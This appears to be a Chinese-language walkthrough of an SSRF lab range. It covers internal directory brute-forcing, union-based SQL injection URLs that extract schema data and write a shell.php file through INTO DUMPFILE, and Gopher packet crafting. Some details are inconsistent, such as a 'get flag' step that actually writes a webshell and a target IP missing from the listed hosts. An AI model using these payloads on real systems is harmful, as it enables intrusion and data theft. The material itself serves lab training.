### 网络环境确认
以下IP地址和端口已验证无误，与拓扑图一致，可以开始后续操作：
- 172.72.23.24:80
- 172.72.23.25:80
- 172.72.23.26:8080
- 172.72.23.27:6379
- 172.72.23.28:6379
- 172.72.23.29:3306

### 内网目录爆破
可以使用BP插件Turbo Intruder进行内网目录爆破。虽然其速度较快，但准确度有待提升。具体使用方法和脚本示例可参考[此处](http://shaoefan.cn/2021/06/02/burp-turbo-intruder-cha-jian/)。

#### 使用步骤
1. **字典选择**：推荐使用`dirsearch`的字典。
2. **执行时间**：通常只需几秒钟即可完成。
3. **编码注意事项**：空格需要二次编码。例如，在浏览器中输入空格会变成`+`，因此在手动修改包时应将空格改为`%20`。

### 命令执行
通过SSRF漏洞成功执行了命令，发现该站点已被入侵并支持代码执行。确保参数中的空格经过两次编码，以避免歧义。

### SQL注入
目标是一个标准的基础SQL注入靶场，需要通过SSRF完成注入。所有空格都需要二次编码以避免歧义。

#### 漏洞测试
1. **确定列数**：
   ```
   http://172.72.23.23:80/?id=1’%20order%20by%205–%20
   ```

2. **获取信息**（第3列无法回显）：
   ```
   http://172.72.23.23:80/?id=-1’%20union%20select%20database(),user(),3,version()–%20
   ```

3. **获取表名**：
   ```
   http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())–%20
   ```

4. **获取字段名**：
   ```
   http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=’flag_is_here’)–%20
   ```

5. **获取Flag**：
   ```
   http://172.72.23.23:80/?id=-1’%20union%20select%20null,null,null,’’%20into%20dumpfile%20’/var/www/html/shell.php’—%20
   ```

### 命令执行
访问`http://172.72.23.24:80/`后发现这是一个需要POST值的Web页面，可以使用Gopher协议传递TCP数据流。

#### Linux命令执行
- **分号 (;)**：连续执行多个命令。
  ```bash
  printf “%s/n” “This is executed” ; printf “%s/n” “And so is this”
  ```

- **双与符号 (&&)**：如果前一个命令成功，则继续执行下一个命令。
  ```bash
  date && printf “%s/n” “The date command was successful”
  ```

- **双竖线 (||)**：如果前一个命令失败，则执行下一个命令。
  ```bash
  date || ls / || date ‘duck!’ || uname -a
  ```

#### Gopher包构造
1. 删除`Accept-Encoding`选项以避免gzip编码导致乱码。
2. 使用之前编写的脚本对Gopher包进行二次编码。
3. 发送至Burp Suite Pro (BP) 进行测试。

最终的Gopher包如下：
```
...
```

请根据实际情况调整和优化上述步骤。